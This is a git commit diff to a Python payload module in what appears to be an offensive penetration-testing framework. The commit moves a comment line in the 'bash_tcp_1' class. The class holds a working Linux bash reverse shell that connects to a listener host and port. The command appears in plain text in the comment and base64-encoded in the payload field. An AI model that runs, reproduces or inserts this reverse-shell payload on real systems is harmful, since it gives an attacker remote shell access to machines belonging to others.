1f2bf4ceb354d935f8843bf1208805af84a16221
mt-code <matthew.croston@btinternet.com>
2022-01-01 12:28:30 +0000

    refactor: bash_tcp_1 payload structure

--- lib/framework/payloads/bash_tcp_1.py
+++ lib/framework/payloads/bash_tcp_1.py
@@ -1,9 +1,8 @@
 from lib.framework.core.payload import Payload
 
 
+# bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1
 class bash_tcp_1(Payload):
     name = "bash_tcp_1"
     platform = ["linux"]
-
-    # bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1
     payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC97TEhPU1R9L3tMUE9SVH0gMD4mMQ=="
